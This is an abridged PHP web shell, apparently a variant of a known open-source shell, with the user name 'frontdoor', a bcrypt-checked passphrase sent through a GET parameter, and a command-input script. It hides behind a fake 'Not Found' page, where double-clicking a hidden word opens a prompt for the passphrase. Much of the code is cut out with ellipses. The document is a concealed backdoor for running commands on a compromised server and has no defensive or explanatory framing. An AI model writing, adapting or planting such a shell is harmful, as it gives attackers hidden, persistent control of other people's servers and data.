...
$SHELL_CONFIG = array(
  'username' => 'frontdoor',
  'hostname' => 'shell',
  'password' => '$2a$12$NxEcOvo5N/7I.B2SL3lXb.54ZJ8sba4ytnY8Sg2SMrpJ.eZUNgNuW' //bcrypt
);

if (isset($_GET["phrase"])) {
  $phrase = base64_decode(urldecode($_GET["phrase"]));
  if (password_verify($phrase, $SHELL_CONFIG['password'])) {
  ...
  <head>
    ...
    <script>
      ...
      function _onShellCmdKeyDown(event) {
        switch (event.key) {
          case "Enter":
            if (eShellCmdInput.value === 'logout') {
...
END;
  ...
  <body>
    <h1>Not Found</h1>
    <p>The requested URL was not <span>found</span> on this server.</p>
  </body>

  <script>
    document.querySelector('span').addEventListener('dblclick', function() {
      let phrase = prompt("Whisper your enchanted phrase, esteemed sovereign, to reveal the hidden wonders");

      if (phrase != null) {
        const encryptedPhrase = btoa(unescape(encodeURIComponent(phrase)));
        window.location.href = location.pathname + "?phrase=" + encodeURIComponent(encryptedPhrase);
      }
    });
  </script>
